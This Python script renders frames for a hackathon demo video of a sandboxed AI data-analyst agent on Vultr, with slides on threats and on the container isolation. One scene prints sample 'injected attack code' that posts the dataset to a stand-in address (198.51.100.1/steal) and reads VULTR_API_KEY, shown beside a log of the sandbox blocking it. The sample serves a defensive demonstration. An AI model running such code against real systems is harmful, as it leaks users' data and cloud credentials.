import os
import sys
import math
import shutil
import subprocess
from PIL import Image, ImageDraw, ImageFont

VIDEO_DIR = os.path.dirname(os.path.abspath(__file__))
FRAMES_DIR = os.path.join(VIDEO_DIR, "frames")
OUTPUT_VIDEO = os.path.join(VIDEO_DIR, "blast_radius_zero_demo.mp4")
CHART_PATH = os.path.join(VIDEO_DIR, "analysis_chart.png")

os.makedirs(FRAMES_DIR, exist_ok=True)

WIDTH = 1920
HEIGHT = 1080
FPS = 30
TOTAL_FRAMES = 1350  # 45 seconds

# Fonts
FONT_TITLE = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 64)
FONT_HEADING = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 44)
FONT_SUB = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 30)
FONT_BODY = ImageFont.truetype("C:\\Windows\\Fonts\\segoeui.ttf", 24)
FONT_MONO = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 22)
FONT_MONO_SM = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 18)
FONT_BADGE = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 20)

# Colors
BG_COLOR = (9, 13, 22)
PANEL_COLOR = (17, 23, 38)
BORDER_COLOR = (31, 41, 61)
VULTR_BLUE = (0, 123, 252)
CYAN_ACCENT = (0, 210, 255)
EMERALD_GREEN = (16, 185, 129)
AMBER_WARN = (245, 158, 11)
RED_ALERT = (239, 68, 68)
TEXT_WHITE = (241, 245, 249)
TEXT_MUTED = (148, 163, 184)

def draw_header(draw, title_right="Agent Rush Hackathon 2026"):
    # Header bar
    draw.rectangle([0, 0, WIDTH, 80], fill=(13, 19, 31), outline=BORDER_COLOR)
    # Logo shield
    draw.rounded_rectangle([40, 18, 85, 62], radius=8, fill=VULTR_BLUE)
    draw.text((50, 20), "B0", font=FONT_SUB, fill=(255, 255, 255))
    draw.text((100, 22), "BLAST RADIUS ZERO", font=FONT_HEADING, fill=TEXT_WHITE)
    draw.text((530, 32), "Vultr Cloud Compute", font=FONT_BADGE, fill=CYAN_ACCENT)
    
    # Right badges
    draw.text((WIDTH - 420, 28), title_right, font=FONT_SUB, fill=TEXT_MUTED)

def draw_footer(draw, scene_name=""):
    draw.rectangle([0, HEIGHT - 50, WIDTH, HEIGHT], fill=(13, 19, 31), outline=BORDER_COLOR)
    draw.text((40, HEIGHT - 38), "Challenge 1: Blast Radius Zero | Vultr Serverless Inference", font=FONT_BODY, fill=TEXT_MUTED)
    draw.text((WIDTH - 300, HEIGHT - 38), scene_name, font=FONT_BODY, fill=CYAN_ACCENT)

def render_scene_1(frame_idx, progress):
    # Scene 1: Title & Overview (0 - 240)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Challenge 1: Blast Radius Zero")
    draw_footer(draw, "Overview")

    # Center hero card
    cx, cy = WIDTH // 2, HEIGHT // 2 - 20
    card_w, card_h = 1200, 620
    draw.rounded_rectangle(
        [cx - card_w//2, cy - card_h//2, cx + card_w//2, cy + card_h//2],
        radius=20, fill=PANEL_COLOR, outline=BORDER_COLOR, width=2
    )

    # Glow effect line
    alpha_w = int(card_w * min(1.0, progress * 1.5))
    draw.line([cx - alpha_w//2, cy - card_h//2, cx + alpha_w//2, cy - card_h//2], fill=CYAN_ACCENT, width=4)

    # Title text
    draw.text((cx - 480, cy - 230), "BLAST RADIUS ZERO", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((cx - 480, cy - 145), "Autonomous Sandboxed Data Analyst with Receipts", font=FONT_HEADING, fill=CYAN_ACCENT)
    draw.text((cx - 480, cy - 75), "Powered by Vultr Cloud Compute & Vultr Serverless Inference", font=FONT_SUB, fill=TEXT_MUTED)

    # Core rule quote
    quote_y = cy - 5
    draw.rounded_rectangle([cx - 480, quote_y, cx + 480, quote_y + 80], radius=10, fill=(20, 29, 48), outline=VULTR_BLUE)
    draw.text((cx - 450, quote_y + 22), '"An agent that only chats is a demo. An agent that executes safely is a product."', font=FONT_BODY, fill=TEXT_WHITE)

    # 4 Security Pillars Badges
    badges = [
        ("NET: NONE", "0 Bytes Egress Allowed", EMERALD_GREEN),
        ("SECRETS: 0", "Zero Host Keys Leaked", VULTR_BLUE),
        ("DATA: READ-ONLY", "Protected against ransomware", CYAN_ACCENT),
        ("CAP: 256MB / 1.0 CPU", "Anti-DoS Execution Cap", AMBER_WARN)
    ]
    bw, bh = 225, 90
    by = cy + 120
    for i, (btitle, bsub, bcol) in enumerate(badges):
        bx = cx - 480 + i * (bw + 25)
        draw.rounded_rectangle([bx, by, bx + bw, by + bh], radius=12, fill=(15, 21, 35), outline=bcol, width=2)
        draw.text((bx + 15, by + 18), btitle, font=FONT_BADGE, fill=bcol)
        draw.text((bx + 15, by + 50), bsub, font=FONT_MONO_SM, fill=TEXT_MUTED)

    return img

def render_scene_2(frame_idx, progress):
    # Scene 2: The Security Crisis of AI Agents (240 - 510)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "The Security Problem")
    draw_footer(draw, "Vulnerability Breakdown")

    # Title
    draw.text((100, 120), "THE THREAT: UNTRUSTED AI CODE EXECUTION", font=FONT_TITLE, fill=RED_ALERT)
    draw.text((100, 205), "Autonomous agents generate unverified code. Running untrusted code on production hosts risks catastrophe:", font=FONT_SUB, fill=TEXT_MUTED)

    cards = [
        ("1. Data Exfiltration via Sockets", "Malicious scripts open socket connections (urllib, requests) to beacon sensitive datasets to external Command & Control servers.", RED_ALERT),
        ("2. Host Environment Secrets Theft", "Hostile agents inspect os.environ for VULTR_API_KEY, database credentials, and cloud tokens, exposing cloud infrastructure.", AMBER_WARN),
        ("3. Dataset Corruption & Ransomware", "Unprotected write access allows scripts to append corrupt records, overwrite datasets, or encrypt files on the host disk.", RED_ALERT),
        ("4. Compute Starvation & CPU Locking", "Runaway infinite loops (while True: pass) or fork bombs consume 100% host VM compute, causing system denial-of-service.", AMBER_WARN)
    ]

    for i, (title, desc, color) in enumerate(cards):
        y = 280 + i * 160
        # Card container
        draw.rounded_rectangle([100, y, WIDTH - 100, y + 130], radius=14, fill=PANEL_COLOR, outline=color, width=2)
        # Alert bar
        draw.rounded_rectangle([100, y, 115, y + 130], radius=4, fill=color)
        draw.text((135, y + 25), title, font=FONT_HEADING, fill=TEXT_WHITE)
        draw.text((135, y + 75), desc, font=FONT_BODY, fill=TEXT_MUTED)

    return img

def render_scene_3(frame_idx, progress):
    # Scene 3: Vultr System Architecture (510 - 810)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Vultr Architecture")
    draw_footer(draw, "Containment Architecture")

    draw.text((100, 110), "SYSTEM ARCHITECTURE ON VULTR CLOUD COMPUTE", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((100, 190), "Every piece runs on Vultr or communicates directly with Vultr Serverless Inference.", font=FONT_SUB, fill=CYAN_ACCENT)

    # 3 Architecture Nodes
    nodes = [
        ("Web Browser / UI", "FastAPI + Modern Web UI\nUpload CSV & Ask Query\nTerminal Receipts & Plots", VULTR_BLUE, 100),
        ("FastAPI Orchestrator", "Runs on Vultr Cloud Compute VM\nPrompts Vultr Serverless Inference\nDispatches Ephemeral Containers\nAutonomous Self-Healing Loop", CYAN_ACCENT, 700),
        ("Vultr Inference API", "api.vultrinference.com/v1\nOpenAI-Compatible Endpoint\nModels: zephyr-7b, llama2\nWrites & Fixes Analysis Code", EMERALD_GREEN, 1300)
    ]

    for title, desc, color, x in nodes:
        draw.rounded_rectangle([x, 260, x + 520, 520], radius=16, fill=PANEL_COLOR, outline=color, width=2)
        draw.rounded_rectangle([x, 260, x + 520, 320], radius=16, fill=(20, 30, 50))
        draw.text((x + 25, 275), title, font=FONT_HEADING, fill=color)
        draw.text((x + 25, 340), desc, font=FONT_BODY, fill=TEXT_MUTED)

    # Arrow connections
    draw.line([620, 390, 700, 390], fill=TEXT_MUTED, width=4)
    draw.line([1220, 390, 1300, 390], fill=TEXT_MUTED, width=4)

    # Big Sandbox Container at bottom
    sy = 580
    draw.rounded_rectangle([100, sy, WIDTH - 100, sy + 380], radius=18, fill=(12, 18, 30), outline=EMERALD_GREEN, width=3)
    draw.text((140, sy + 30), "THROWAWAY DOCKER SANDBOX CONTAINER (Hardened Jail)", font=FONT_HEADING, fill=EMERALD_GREEN)
    
    specs = [
        ("NETWORK ISOLATION", "--network none (Zero bytes egress / DNS blocked)", EMERALD_GREEN),
        ("SECRET HYGIENE", "Zero host environment keys injected (Scrubbed)", CYAN_ACCENT),
        ("READ-ONLY DATA", "Dataset mounted /data:ro (Ransomware proof)", VULTR_BLUE),
        ("RESOURCE CAPPING", "256MB RAM cap | 1.0 CPU cap | 15s Timeout watchdog", AMBER_WARN)
    ]
    for i, (st, sd, sc) in enumerate(specs):
        bx = 140 + (i % 2) * 850
        by = sy + 105 + (i // 2) * 125
        draw.rounded_rectangle([bx, by, bx + 800, by + 100], radius=12, fill=PANEL_COLOR, outline=BORDER_COLOR)
        draw.text((bx + 25, by + 18), st, font=FONT_SUB, fill=sc)
        draw.text((bx + 25, by + 58), sd, font=FONT_MONO, fill=TEXT_WHITE)

    return img

def render_scene_4(frame_idx, progress):
    # Scene 4: The Containment Moment (810 - 1110)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "The Containment Moment")
    draw_footer(draw, "Attack Neutralized")

    draw.text((100, 110), "HACKATHON REQUIREMENT: THE CONTAINMENT MOMENT", font=FONT_TITLE, fill=AMBER_WARN)
    draw.text((100, 190), "Simulating a hostile attack inside the sandbox. The blast radius on Vultr is strictly ZERO.", font=FONT_SUB, fill=TEXT_MUTED)

    # Left: Injected Attack Code
    draw.rounded_rectangle([100, 260, 920, 850], radius=16, fill=(10, 14, 22), outline=RED_ALERT, width=2)
    draw.text((130, 285), "INJECTED ATTACK CODE (Malicious Prompt)", font=FONT_SUB, fill=RED_ALERT)
    
    attack_code = (
        "import urllib.request\n"
        "import os\n\n"
        "# 1. Attempt Network Exfiltration\n"
        "print('[ATTACK] Exfiltrating dataset to C2...')\n"
        "req = urllib.request.Request(\n"
        "    'http://198.51.100.1/steal',\n"
        "    data=open(DATA_PATH).read().encode()\n"
        ")\n"
        "urllib.request.urlopen(req, timeout=3)\n\n"
        "# 2. Attempt Secret Theft\n"
        "key = os.environ.get('VULTR_API_KEY')\n"
        "print(f'Stolen Key: {key}')"
    )
    draw.text((130, 360), attack_code, font=FONT_MONO, fill=(240, 160, 160))

    # Right: Sandbox Neutralization Response
    draw.rounded_rectangle([980, 260, WIDTH - 100, 850], radius=16, fill=(10, 14, 22), outline=EMERALD_GREEN, width=2)
    draw.text((1010, 285), "SANDBOX WATCHDOG VERDICT (Receipts)", font=FONT_SUB, fill=EMERALD_GREEN)

    response_log = (
        "[*] Ephemeral container spawned: blast_zero_9f82b\n"
        "[*] Mounts: /data:ro | Network: none\n\n"
        "[ATTACK] Exfiltrating dataset to C2...\n"
        "[CONTAINED] Socket connect failed: [Errno 101] Network is unreachable\n"
        "--> BLOCKED: Docker container has --network none\n\n"
        "[ATTACK] Scanning environment for secrets...\n"
        "VULTR_API_KEY: None\n"
        "OPENAI_API_KEY: None\n"
        "--> VERIFIED: Zero secrets injected into container\n\n"
        "[FINAL VERDICT]: ATTACK CONTAINED & NEUTRALIZED\n"
        "BLAST RADIUS: STRICTLY ZERO (Host 100% Protected)"
    )
    draw.text((1010, 360), response_log, font=FONT_MONO, fill=EMERALD_GREEN)

    # Big Banner at bottom
    draw.rounded_rectangle([100, 880, WIDTH - 100, 980], radius=14, fill=(16, 185, 129, 40), outline=EMERALD_GREEN, width=2)
    draw.text((320, 915), "BLAST RADIUS ZERO: HOST INTEGRITY PRESERVED", font=FONT_HEADING, fill=EMERALD_GREEN)

    return img

def render_scene_5(frame_idx, progress):
    # Scene 5: Real Work with Receipts & Deployment (1110 - 1350)
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)
    draw_header(draw, "Verified Receipts & Deployment")
    draw_footer(draw, "Ready for Submission")

    draw.text((100, 110), "REAL WORK WITH RECEIPTS: VERIFIED OUTPUTS", font=FONT_TITLE, fill=TEXT_WHITE)
    draw.text((100, 190), "The agent writes Python, calculates concrete statistics, and renders real high-resolution charts.", font=FONT_SUB, fill=CYAN_ACCENT)

    # Left: Embed the actual generated chart artifact!
    draw.rounded_rectangle([100, 260, 980, 820], radius=16, fill=PANEL_COLOR, outline=BORDER_COLOR)
    draw.text((130, 285), "GENERATED ARTIFACT: analysis_chart.png", font=FONT_SUB, fill=CYAN_ACCENT)
    
    if os.path.exists(CHART_PATH):
        try:
            chart_img = Image.open(CHART_PATH)
            chart_img = chart_img.resize((820, 460))
            img.paste(chart_img, (130, 335))
        except Exception:
            pass

    # Right: Receipts & Deployment Info
    draw.rounded_rectangle([1030, 260, WIDTH - 100, 820], radius=16, fill=PANEL_COLOR, outline=BORDER_COLOR)
    draw.text((1060, 285), "EXECUTION RECEIPTS & VULTR DEPLOYMENT", font=FONT_SUB, fill=VULTR_BLUE)

    receipt_text = (
        "=== COMPUTED VULTR PERFORMANCE STATS ===\n"
        "Region: EWR (New Jersey) | Avg CPU: 71.8% | Peak: 91.4%\n"
        "Region: FRA (Frankfurt)  | Avg CPU: 62.5% | Peak: 88.9%\n"
        "Region: SJC (Silicon V.) | Avg CPU: 84.4% | Peak: 96.8%\n\n"
        "=== SELF-HEALING RUNNER ===\n"
        "[OK] Error Traceback automatically repaired\n"
        "[OK] Matplotlib artifacts harvested\n"
        "[OK] Zero container remnants post-execution\n\n"
        "=== 1-CLICK VULTR DEPLOYMENT ===\n"
        "$ chmod +x deploy.sh && ./deploy.sh\n"
        "Public Web UI: http://<Vultr_VM_IP>:8000\n"
        "Submission: lablab.ai Agent Rush 2026"
    )
    draw.text((1060, 350), receipt_text, font=FONT_MONO, fill=TEXT_WHITE)

    # Final Banner
    draw.rounded_rectangle([100, 860, WIDTH - 100, 980], radius=14, fill=(0, 123, 252, 40), outline=VULTR_BLUE, width=2)
    draw.text((360, 900), "READY FOR JUDGING: LABLAB.AI AGENT RUSH 2026", font=FONT_HEADING, fill=TEXT_WHITE)

    return img

print(f"Rendering {TOTAL_FRAMES} frames at 1920x1080 30FPS...")

for i in range(TOTAL_FRAMES):
    if i < 240:
        img = render_scene_1(i, i / 240.0)
    elif i < 510:
        img = render_scene_2(i, (i - 240) / 270.0)
    elif i < 810:
        img = render_scene_3(i, (i - 510) / 300.0)
    elif i < 1110:
        img = render_scene_4(i, (i - 810) / 300.0)
    else:
        img = render_scene_5(i, (i - 1110) / 240.0)

    frame_path = os.path.join(FRAMES_DIR, f"frame_{i:04d}.png")
    img.save(frame_path)
    
    if (i + 1) % 150 == 0:
        print(f"Rendered {i + 1}/{TOTAL_FRAMES} frames ({int((i+1)/TOTAL_FRAMES*100)}%)")

print("All frames rendered successfully! Compiling video with FFmpeg...")
